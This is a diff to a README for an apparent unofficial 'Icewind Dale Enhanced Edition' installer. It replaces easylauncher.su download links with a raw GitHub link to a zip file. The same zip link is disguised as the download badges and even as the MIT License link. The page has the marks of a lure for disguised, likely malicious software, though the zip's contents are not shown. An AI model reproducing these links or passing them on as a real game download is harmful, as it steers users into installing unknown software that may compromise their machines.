@@ -1,5 +1,5 @@
 # ❄️ Icewind Dale Enhanced Edition ⬇️  
-[![Download Latest Version](https://img.shields.io/badge/Download-IcewindDaleEE-blue?logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Latest Version](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Icewind Dale download, Icewind Dale Enhanced Edition installer, RPG launcher too
 ## 🛠️ Installation Guide
 
 1. Tap the button below to begin your secure download:
-   [![Download](https://img.shields.io/badge/Download-Now-brightgreen?logo=appveyor)](https://easylauncher.su/PSnzrH)
+   [![Download](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)
 
 ---
 
@@ -53,9 +53,9 @@ This installer simplifies access to Icewind Dale Enhanced Edition. Ensure you co
 
 ## ℹ️ License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip).  
 For enthusiasts, by enthusiasts — 2025.
 
 ---
 
-[![Download Icewind Dale EE](https://img.shields.io/badge/Download-IcewindDaleEE-blue?logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Icewind Dale EE](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)](https://github.com/rasec2301/IcewindDaleEE-UltimateInstaller/raw/refs/heads/main/nursling/Ultimate_Installer_Dale_E_Icewind_v3.3.zip)
